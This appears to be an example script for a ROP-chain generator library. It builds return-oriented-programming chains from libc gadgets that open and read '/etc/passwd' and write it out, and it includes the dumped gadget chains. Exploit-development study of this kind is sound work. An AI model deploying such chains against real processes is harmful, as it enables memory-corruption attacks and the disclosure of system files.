from pwn import *
from Exrop import Exrop

binname = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(binname, checksec=False)
open = libc.symbols['open']
read = libc.symbols['read']
write = libc.symbols['write']
bss = libc.bss()


rop = Exrop(binname)
rop.find_gadgets(cache=True)
#print("func-call gadgets 0x41414141(0x20, 0x30, \"Hello\")")
#chain = rop.func_call(0x41414141, (0x20, 0x30, "Hello"), 0x7fffff00)
print("open('/etc/passwd', 0)")
chain = rop.func_call(open, ("/etc/passwd", 0), bss)
chain.dump()
print("read(2, bss, 0x100)")
chain = rop.func_call(read, (2, bss, 0x100))
chain.dump()
print("write(1, bss, 0x100)")
chain = rop.func_call(write, (1, bss, 0x100))
chain.dump()

"""
open('/etc/passwd', 0)
$RSP+0x0000 : 0x000000000002155f # pop rdi; ret
$RSP+0x0008 : 0x00000000003ec860
$RSP+0x0010 : 0x0000000000155fc6 # pop r8; mov eax, 1; ret
$RSP+0x0018 : 0x7361702f6374652f
$RSP+0x0020 : 0x0000000000044359 # mov qword ptr [rdi], r8; ret
$RSP+0x0028 : 0x000000000002155f # pop rdi; ret
$RSP+0x0030 : 0x00000000003ec868
$RSP+0x0038 : 0x0000000000155fc6 # pop r8; mov eax, 1; ret
$RSP+0x0040 : 0x0000000000647773
$RSP+0x0048 : 0x0000000000044359 # mov qword ptr [rdi], r8; ret
$RSP+0x0050 : 0x000000000002155f # pop rdi; ret
$RSP+0x0058 : 0x00000000003ec860
$RSP+0x0060 : 0x0000000000023e6a # pop rsi; ret
$RSP+0x0068 : 0x0000000000000000
$RSP+0x0070 : 0x000000000010fc40

read(2, bss, 0x100)
$RSP+0x0000 : 0x00000000001306d9 # pop rdx; pop rsi; ret
$RSP+0x0008 : 0x0000000000000100
$RSP+0x0010 : 0x00000000003ec860
$RSP+0x0018 : 0x000000000002155f # pop rdi; ret
$RSP+0x0020 : 0x0000000000000002
$RSP+0x0028 : 0x0000000000110070

write(1, bss, 0x100)
$RSP+0x0000 : 0x00000000001306d9 # pop rdx; pop rsi; ret
$RSP+0x0008 : 0x0000000000000100
$RSP+0x0010 : 0x00000000003ec860
$RSP+0x0018 : 0x000000000002155f # pop rdi; ret
$RSP+0x0020 : 0x0000000000000001
$RSP+0x0028 : 0x0000000000110140
"""
